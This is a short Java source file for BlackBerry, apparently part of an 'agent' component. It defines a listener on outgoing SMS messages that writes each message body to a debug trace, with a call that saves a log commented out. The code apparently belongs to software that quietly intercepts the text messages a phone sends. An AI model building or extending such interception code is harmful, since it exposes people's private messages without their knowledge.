package blackberry.agent.sms;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.SendListener;

//#ifdef SMS46
public class SMSOUTListener2 implements SendListener {
    SmsListener smsListener;
    //#ifdef DEBUG
    private static Debug debug = new Debug("SMSOUTListener", DebugLevel.VERBOSE);
    //#endif

    public SMSOUTListener2(SmsListener smsListener) {
        this.smsListener = smsListener;
    }

    public boolean sendMessage(Message message) {

        debug.trace(message.getBodyText());
        //smsListener.saveLog(message, false);

        return true;
    }

}
//#endif